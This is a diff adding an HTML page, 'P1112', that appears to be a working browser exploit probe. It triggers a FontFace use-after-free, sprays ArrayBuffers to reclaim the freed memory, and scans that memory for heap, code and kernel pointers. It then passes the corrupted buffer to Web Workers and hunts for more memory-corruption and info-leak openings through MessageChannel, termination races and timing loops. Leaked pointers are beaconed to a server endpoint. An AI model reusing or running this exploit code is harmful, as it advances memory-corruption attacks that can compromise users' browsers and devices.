@@ -1,0 +1,548 @@
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>P1112</title>
+<style>*{margin:0;padding:0;box-sizing:border-box}body{background:#0a0a0f;color:#c8ffc8;font:11px/1.4 monospace;padding:10px;min-height:100vh}#log{white-space:pre-wrap;word-break:break-all}.ok{color:#6f6}.fail{color:#f66}.ptr{color:#f6f}.info{color:#6cf}.phase{color:#fff;font-size:13px;font-weight:bold;margin:6px 0}.win{color:#0f0;font-weight:bold;font-size:14px}.warn{color:#ff6}</style>
+</head><body>
+<div id="log"></div>
+<script>
+var L=document.getElementById('log');
+function log(c,m){var d=document.createElement('div');d.className=c;d.textContent=m;L.appendChild(d);L.scrollTop=L.scrollHeight;}
+function B(t,d){try{new Image().src='/beacon.php?tag='+encodeURIComponent(t)+'&data='+encodeURIComponent(d||'')+'&_='+Math.random();}catch(e){}}
+function hex64(v){if(typeof v==='bigint'){var s=v.toString(16);while(s.length<16)s='0'+s;return'0x'+s;}return'0x0';}
+function ptrTag(v){
+  if(typeof v!=='bigint'||v===0n)return'';
+  var hi=Number(v>>32n);
+  if(hi>=0x10&&hi<=0xFF)return'HEAP';
+  if(hi>=0x200&&hi<=0x7FFF)return'CODE!';
+  if(hi>=0xFFFF8000)return'KERN!';
+  if(v<0x10000n)return'small';
+  return'val';
+}
+
+B('P1112-BOOT','');
+log('phase','=== P1112: WORKER + UAF TRANSFER + NEW VECTORS ===');
+log('info','Fix: UAF first, THEN Worker. Plus MessageChannel + termination races.');
+
+// ============================================================
+// STEP 1: FontFace UAF + reclaim FIRST (proven pattern)
+// ============================================================
+var SIZES=[64,96,128,160,192,224,256,320,384,512,768,1024,2048];
+var K=8;
+var st1=document.createElement('style');
+st1.textContent="@font-face{font-family:s0;src:local(Arial);unicode-range:U+0042;}";
+document.head.appendChild(st1);
+var f0=new FontFace('f0','local(Helvetica)',{unicodeRange:'U+0041'});
+document.fonts.add(f0);void f0.loaded;
+
+var fired=false,map1=null,buf=null,uafAB=null,patched=false,uafIdx=-1;
+
+Object.defineProperty(FontFace.prototype,'then',{configurable:true,get:function(){
+  if(fired)return undefined;fired=true;
+  if(st1){st1.remove();st1=null;}
+  try{document.fonts.delete(this);}catch(e){}
+  document.body.offsetHeight;
+  map1=[];
+  for(var si=0;si<SIZES.length;si++){
+    var sz=SIZES[si];
+    for(var k=0;k<K;k++){map1.push({size:sz,ab:new ArrayBuffer(sz),idx:si*K+k});}
+  }
+  try{document.fonts.check('1em s0');}catch(e){}
+  return undefined;
+},set:function(){}});
+document.fonts.load('1em f0, s0','AB').then(function(){},function(){});
+
+// Scan for reclaim
+for(var t=10;t<=300;t+=5){(function(ms){setTimeout(function(){
+  if(patched||!map1)return;
+  for(var bi=32;bi<40;bi++){
+    if(!map1[bi])continue;
+    var b=new BigUint64Array(map1[bi].ab);
+    var nz=0;for(var q=0;q<b.length;q++)if(b[q]!==0n)nz++;
+    if(nz>0&&!patched){
+      patched=true;buf=b;uafAB=map1[bi].ab;uafIdx=bi;
+      b[0]=0x100n;
+      var ptrs=[];
+      for(var q=0;q<b.length;q++){
+        if(b[q]!==0n)ptrs.push('+'+q*8+'='+hex64(b[q])+'('+ptrTag(b[q])+')');
+      }
+      B('P1112-UAF','buf='+bi+'|nz='+nz+'|'+ptrs.join(','));
+      log('ok','UAF reclaimed at buf='+bi+', '+nz+' nonzero qwords');
+      // NOW launch all Worker phases
+      setTimeout(startWorkerPhases, 50);
+    }
+  }
+},ms);})(t);}
+
+// Fallback if no reclaim
+setTimeout(function(){
+  if(!patched){
+    B('P1112-NOUAF','');
+    log('fail','No UAF reclaim — running Worker phases without transfer');
+    startWorkerPhases();
+  }
+},500);
+
+function startWorkerPhases(){
+  log('phase','--- PHASE A: Transfer UAF buffer to Worker ---');
+
+  // ============================================================
+  // PHASE A: Create worker and transfer UAF ArrayBuffer
+  // ============================================================
+  var wCodeA=[
+    'self.onmessage=function(e){',
+    '  var d=e.data;',
+    '  if(d.type==="uaf_read"){',
+    '    var ab=d.buffer;',
+    '    var v=new BigUint64Array(ab);',
+    '    var nz=0,ptrs=[];',
+    '    for(var q=0;q<v.length;q++){',
+    '      if(v[q]!==0n){',
+    '        nz++;',
+    '        var hi=Number(v[q]>>32n);',
+    '        var tag=(hi>=0x10&&hi<=0xFF)?"HEAP":(hi>=0x200&&hi<=0x7FFF)?"CODE!":(hi>=0xFFFF8000)?"KERN!":"val";',
+    '        ptrs.push("+"+q*8+"=0x"+v[q].toString(16)+"("+tag+")");',
+    '      }',
+    '    }',
+    '    // Write a marker to verify Worker can modify the memory',
+    '    if(v.length>2) v[2]=0xDEADCAFEn;',
+    '    postMessage({type:"uaf_result",nz:nz,ptrs:ptrs.join("|"),len:v.length});',
+    '    // Transfer back',
+    '    postMessage({type:"uaf_back",buffer:ab},[ab]);',
+    '  }',
+    '  if(d.type==="msgport"){',
+    '    var port=d.port;',
+    '    // Read messages from the port',
+    '    port.onmessage=function(ev){',
+    '      postMessage({type:"port_msg",data:""+ev.data});',
+    '    };',
+    '    port.postMessage("worker_ping");',
+    '    postMessage({type:"port_ready"});',
+    '  }',
+    '  if(d.type==="timing_loop"){',
+    '    // Count iterations as fast as possible, report via postMessage',
+    '    var count=0;',
+    '    var start=performance.now();',
+    '    while(performance.now()-start<d.duration) count++;',
+    '    postMessage({type:"timing_done",count:count,duration:d.duration});',
+    '  }',
+    '};'
+  ].join('\n');
+
+  var blobA=new Blob([wCodeA],{type:'application/javascript'});
+  var urlA=URL.createObjectURL(blobA);
+  var workerA=new Worker(urlA);
+
+  workerA.onmessage=function(e){
+    var d=e.data;
+    if(d.type==='uaf_result'){
+      B('P1112-A-XFER','nz='+d.nz+'|len='+d.len+'|'+d.ptrs);
+      log(d.nz>0?'win':'info','A: Worker read UAF buffer: '+d.nz+' nonzero | '+d.ptrs);
+    }
+    if(d.type==='uaf_back'){
+      // Got buffer back — check Worker's marker
+      var view=new BigUint64Array(d.buffer);
+      var marker=view.length>2?hex64(view[2]):'none';
+      B('P1112-A-BACK','marker='+marker+'|len='+view.length);
+      log(marker==='0x00000000deadcafe'?'win':'info','A: Buffer returned, marker='+marker);
+      // Restore the main UAF reference
+      buf=view;uafAB=d.buffer;
+      // Proceed to Phase B
+      phaseB(workerA);
+    }
+    if(d.type==='port_ready'){
+      B('P1112-B-PORTREADY','');
+      log('ok','B: Worker received MessagePort');
+    }
+    if(d.type==='port_msg'){
+      B('P1112-B-PORTMSG',d.data);
+      log('ok','B: Port message from worker: '+d.data);
+    }
+    if(d.type==='timing_done'){
+      B('P1112-D-TIMING','count='+d.count+'|dur='+d.duration);
+      log('info','D: Worker counted '+d.count+' iters in '+d.duration+'ms');
+    }
+  };
+  workerA.onerror=function(e){B('P1112-WERR',e.message);log('fail','Worker error: '+e.message);};
+
+  // Transfer UAF buffer if we have it
+  if(patched&&uafAB&&uafAB.byteLength>0){
+    try{
+      workerA.postMessage({type:'uaf_read',buffer:uafAB},[uafAB]);
+      log('ok','A: Transferred UAF buffer ('+uafAB.byteLength+' bytes) to Worker');
+      B('P1112-A-SENT','bytes='+uafAB.byteLength);
+    }catch(e){
+      B('P1112-A-SENT','ERR:'+e.message);
+      log('fail','A: Transfer failed: '+e.message);
+      phaseB(workerA);
+    }
+  }else{
+    B('P1112-A-SENT','noUAF');
+    log('warn','A: No UAF buffer to transfer');
+    phaseB(workerA);
+  }
+
+  // ============================================================
+  // PHASE B: MessageChannel — create ports, transfer to Worker
+  // MessagePort objects have C++ backing (MessagePortChannel)
+  // If we can leak the backing pointer...
+  // ============================================================
+  function phaseB(w){
+    log('phase','--- PHASE B: MessageChannel vtable hunt ---');
+
+    try{
+      var mc=new MessageChannel();
+      var port1=mc.port1;
+      var port2=mc.port2;
+
+      // Port1 stays in main thread, Port2 goes to Worker
+      port1.onmessage=function(ev){
+        B('P1112-B-MAINMSG',''+ev.data);
+        log('ok','B: Main received from port: '+ev.data);
+      };
+
+      // Transfer port2 to worker
+      w.postMessage({type:'msgport',port:port2},[port2]);
+      B('P1112-B-PORT','transferred');
+
+      // Send data through port
+      setTimeout(function(){
+        port1.postMessage('main_ping');
+        B('P1112-B-PINGMAIN','sent');
+      },100);
+
+      // Now the KEY test: can we see the MessagePort's C++ object?
+      // Create many ports and scan for their backing pointers in heap
+      var ports=[];
+      for(var i=0;i<50;i++){
+        var mc2=new MessageChannel();
+        ports.push(mc2.port1);
+        ports.push(mc2.port2);
+      }
+
+      // Allocate ArrayBuffers near the ports and scan
+      var scanBufs=[];
+      for(var i=0;i<20;i++){
+        scanBufs.push(new ArrayBuffer(192));
+      }
+
+      var codePtrs=[];
+      for(var i=0;i<scanBufs.length;i++){
+        var v=new BigUint64Array(scanBufs[i]);
+        for(var q=0;q<v.length;q++){
+          if(v[q]!==0n){
+            var hi=Number(v[q]>>32n);
+            var tag=(hi>=0x200&&hi<=0x7FFF)?'CODE!':'';
+            if(tag==='CODE!')codePtrs.push('buf'+i+'+'+q*8+'='+hex64(v[q]));
+          }
+        }
+      }
+      B('P1112-B-SCAN','ports=100|bufs=20|code='+codePtrs.length+'|'+codePtrs.join('|'));
+      if(codePtrs.length>0)log('win','B: CODE POINTERS FOUND! '+codePtrs.join(', '));
+      else log('info','B: No code pointers in port vicinity (bmalloc zeroes)');
+
+    }catch(e){
+      B('P1112-B-ERR',e.message);
+      log('fail','B: MessageChannel error: '+e.message);
+    }
+
+    setTimeout(function(){phaseC(w);},200);
+  }
+
+  // ============================================================
+  // PHASE C: Worker termination race
+  // Create Worker, start it doing work, terminate mid-operation
+  // If the C++ backing survives after terminate(), we may get a UAF
+  // ============================================================
+  function phaseC(mainWorker){
+    log('phase','--- PHASE C: Worker termination race ---');
+
+    var raceResults=[];
+    var racesDone=0;
+    var totalRaces=10;
+
+    for(var r=0;r<totalRaces;r++){
+      (function(round){
+        // Worker that allocates and sends data continuously
+        var raceCode=[
+          'var bufs=[];',
+          'for(var i=0;i<100;i++)bufs.push(new ArrayBuffer(256));',
+          'var mc=new MessageChannel();',
+          'setInterval(function(){',
+          '  var ab=new ArrayBuffer(192);',
+          '  var v=new BigUint64Array(ab);',
+          '  v[0]=BigInt(0xCAFE0000+bufs.length);',
+          '  postMessage({type:"data",round:'+round+',buf:ab},[ab]);',
+          '  bufs.push(new ArrayBuffer(256));',
+          '},1);'
+        ].join('\n');
+
+        var rBlob=new Blob([raceCode],{type:'application/javascript'});
+        var rUrl=URL.createObjectURL(rBlob);
+        var rWorker=new Worker(rUrl);
+        var gotMsg=false;
+
+        rWorker.onmessage=function(e){
+          if(!gotMsg){
+            gotMsg=true;
+            // Terminate while Worker is mid-operation
+            rWorker.terminate();
+            URL.revokeObjectURL(rUrl);
+
+            // Now scan our heap for any residue from the killed Worker
+            // The Worker's backing objects SHOULD be freed but...
+            var scanAB=new ArrayBuffer(192);
+            var sv=new BigUint64Array(scanAB);
+            var stale=0;
+            for(var q=0;q<sv.length;q++){
+              if(sv[q]!==0n)stale++;
+            }
+            raceResults.push({round:round,stale:stale});
+
+            racesDone++;
+            if(racesDone>=totalRaces){
+              var totalStale=0;
+              for(var i=0;i<raceResults.length;i++)totalStale+=raceResults[i].stale;
+              B('P1112-C-RACE','rounds='+totalRaces+'|totalStale='+totalStale);
+              log(totalStale>0?'win':'info','C: '+totalRaces+' term races, total stale qwords: '+totalStale);
+              phaseD(mainWorker);
+            }
+          }
+        };
+
+        rWorker.onerror=function(e){
+          racesDone++;
+          raceResults.push({round:round,err:e.message});
+          if(racesDone>=totalRaces){
+            B('P1112-C-RACE','rounds='+totalRaces+'|errors='+raceResults.filter(function(r){return r.err;}).length);
+            phaseD(mainWorker);
+          }
+        };
+
+        // Timeout fallback
+        setTimeout(function(){
+          if(!gotMsg){
+            rWorker.terminate();
+            URL.revokeObjectURL(rUrl);
+            racesDone++;
+            raceResults.push({round:round,timeout:true});
+            if(racesDone>=totalRaces){
+              B('P1112-C-RACE','rounds='+totalRaces+'|timeouts='+raceResults.filter(function(r){return r.timeout;}).length);
+              phaseD(mainWorker);
+            }
+          }
+        },500);
+      })(r);
+    }
+  }
+
+  // ============================================================
+  // PHASE D: Worker timing amplification for memory probing
+  // Use Worker iteration counting to measure timing of operations
+  // ============================================================
+  function phaseD(mainWorker){
+    log('phase','--- PHASE D: Timing amplification test ---');
+
+    // Ask the main worker to do a timed counting loop
+    mainWorker.postMessage({type:'timing_loop',duration:100});
+
+    // Meanwhile do timing from main thread
+    var mainCounts=[];
+    for(var r=0;r<5;r++){
+      var s=performance.now(),c=0;
+      while(performance.now()-s<20)c++;
+      mainCounts.push(c);
+    }
+    B('P1112-D-MAIN','counts='+mainCounts.join(','));
+    log('info','D: Main thread counts per 20ms: '+mainCounts.join(', '));
+
+    setTimeout(function(){phaseE();},500);
+  }
+
+  // ============================================================
+  // PHASE E: structuredClone type exploration
+  // What types survive structured clone? Some might leak internal state
+  // ============================================================
+  function phaseE(){
+    log('phase','--- PHASE E: structuredClone object survey ---');
+
+    var tests=[
+      {name:'ArrayBuffer',fn:function(){return new ArrayBuffer(64);}},
+      {name:'Uint8Array',fn:function(){var a=new Uint8Array(8);a[0]=42;return a;}},
+      {name:'BigUint64Array',fn:function(){var a=new BigUint64Array(4);a[0]=0xDEADn;return a;}},
+      {name:'Map',fn:function(){var m=new Map();m.set('k',42);return m;}},
+      {name:'Set',fn:function(){return new Set([1,2,3]);}},
+      {name:'RegExp',fn:function(){return /test/gi;}},
+      {name:'Date',fn:function(){return new Date();}},
+      {name:'Error',fn:function(){return new Error('test');}},
+      {name:'Blob',fn:function(){return new Blob(['data']);}},
+      {name:'ImageData',fn:function(){return new ImageData(4,4);}},
+      {name:'File',fn:function(){return new File(['content'],'test.txt');}},
+    ];
+
+    var cloneResults=[];
+    for(var i=0;i<tests.length;i++){
+      var t=tests[i];
+      var result='???';
+      try{
+        var orig=t.fn();
+        var clone=structuredClone(orig);
+        result='ok|type='+typeof clone+'|ctor='+(clone.constructor?clone.constructor.name:'?');
+
+        // For ArrayBuffer/TypedArrays, check if clone shares memory
+        if(orig instanceof ArrayBuffer){
+          var ov=new Uint8Array(orig);
+          var cv=new Uint8Array(clone);
+          ov[0]=0xFF;
+          result+='|shared='+(cv[0]===0xFF);
+        }
+      }catch(e){
+        result='ERR:'+e.message.substring(0,50);
+      }
+      cloneResults.push(t.name+'='+result);
+    }
+    B('P1112-E-CLONE',cloneResults.join('|'));
+    log('info','E: Clone results: '+cloneResults.join('; '));
+
+    // Special test: structuredClone with transfer
+    try{
+      var ab=new ArrayBuffer(64);
+      var u8=new Uint8Array(ab);
+      u8[0]=0x42;
+      var cloned=structuredClone(ab,{transfer:[ab]});
+      var result='transferred|origLen='+ab.byteLength+'|cloneLen='+cloned.byteLength;
+      var cv=new Uint8Array(cloned);
+      result+='|val0='+cv[0];
+      B('P1112-E-TRANSFER',result);
+      log('ok','E: Transfer clone: '+result);
+    }catch(e){
+      B('P1112-E-TRANSFER','ERR:'+e.message);
+    }
+
+    setTimeout(phaseF,100);
+  }
+
+  // ============================================================
+  // PHASE F: WebSocket connection test from Worker
+  // Can Worker WebSocket connect? What internal objects are created?
+  // ============================================================
+  function phaseF(){
+    log('phase','--- PHASE F: WebSocket from Worker ---');
+
+    var wsCode=[
+      'try{',
+      '  var ws=new WebSocket("ws://"+self.location.hostname+":9999/test");',
+      '  ws.onopen=function(){postMessage({type:"ws",status:"open"});ws.close();};',
+      '  ws.onerror=function(){postMessage({type:"ws",status:"error"});};',
+      '  ws.onclose=function(){postMessage({type:"ws",status:"closed"});};',
+      '  postMessage({type:"ws",status:"created"});',
+      '}catch(e){',
+      '  postMessage({type:"ws",status:"ERR:"+e.message});',
+      '}'
+    ].join('\n');
+
+    try{
+      var wsBlob=new Blob([wsCode],{type:'application/javascript'});
+      var wsUrl=URL.createObjectURL(wsBlob);
+      var wsWorker=new Worker(wsUrl);
+
+      wsWorker.onmessage=function(e){
+        B('P1112-F-WS',e.data.status);
+        log('info','F: Worker WebSocket: '+e.data.status);
+      };
+      wsWorker.onerror=function(e){
+        B('P1112-F-WS','workerErr:'+e.message);
+      };
+
+      setTimeout(function(){
+        wsWorker.terminate();
+        URL.revokeObjectURL(wsUrl);
+      },3000);
+    }catch(e){
+      B('P1112-F-WS','THROW:'+e.message);
+    }
+
+    // Also test from main thread
+    try{
+      var ws2=new WebSocket('ws://localhost:9999/test');
+      ws2.onerror=function(){B('P1112-F-MAINWS','error');};
+      ws2.onopen=function(){B('P1112-F-MAINWS','open');ws2.close();};
+      setTimeout(function(){try{ws2.close();}catch(e){}},2000);
+    }catch(e){
+      B('P1112-F-MAINWS','THROW:'+e.message);
+    }
+
+    setTimeout(phaseG,500);
+  }
+
+  // ============================================================
+  // PHASE G: Cache API exploration
+  // The Cache API creates C++ CacheStorage objects
+  // ============================================================
+  function phaseG(){
+    log('phase','--- PHASE G: Cache API exploration ---');
+
+    if(typeof caches==='undefined'){
+      B('P1112-G-CACHE','unavailable');
+      log('info','G: Cache API unavailable');
+      phaseFinal();
+      return;
+    }
+
+    caches.open('test-cache').then(function(cache){
+      B('P1112-G-CACHE','opened');
+      log('ok','G: Cache opened successfully');
+
+      // Put a request/response pair
+      var req=new Request('/test-entry');
+      var resp=new Response('cached-data',{headers:{'X-Test':'1'}});
+      return cache.put(req,resp).then(function(){
+        B('P1112-G-PUT','ok');
+        return cache.match('/test-entry');
+      }).then(function(r){
+        if(r){
+          return r.text().then(function(t){
+            B('P1112-G-MATCH','ok|text='+t);
+            log('ok','G: Cache match: '+t);
+          });
+        }else{
+          B('P1112-G-MATCH','nomatch');
+        }
+      }).then(function(){
+        return caches.delete('test-cache');
+      }).then(function(){
+        phaseFinal();
+      });
+    }).catch(function(e){
+      B('P1112-G-CACHE','ERR:'+e.message);
+      log('fail','G: Cache error: '+e.message);
+      phaseFinal();
+    });
+  }
+
+  // ============================================================
+  // FINAL: Check if UAF buffer has any new data from all the activity
+  // ============================================================
+  function phaseFinal(){
+    log('phase','--- FINAL: Post-activity UAF buffer scan ---');
+
+    if(buf&&uafAB&&uafAB.byteLength>0){
+      var allPtrs=[];
+      for(var q=0;q<buf.length;q++){
+        if(buf[q]!==0n){
+          var tag=ptrTag(buf[q]);
+          allPtrs.push('+'+q*8+'='+hex64(buf[q])+'('+tag+')');
+        }
+      }
+      B('P1112-FINAL','ptrs='+allPtrs.length+'|'+allPtrs.join(','));
+      for(var i=0;i<allPtrs.length;i++){
+        var hasCode=allPtrs[i].indexOf('CODE!')>=0;
+        log(hasCode?'win':'ptr',allPtrs[i]);
+      }
+    }else{
+      B('P1112-FINAL','noBuffer');
+    }
+
+    B('P1112-DONE','');
+    log('phase','=== P1112 COMPLETE ===');
+  }
+}
+</script>
+</body></html>
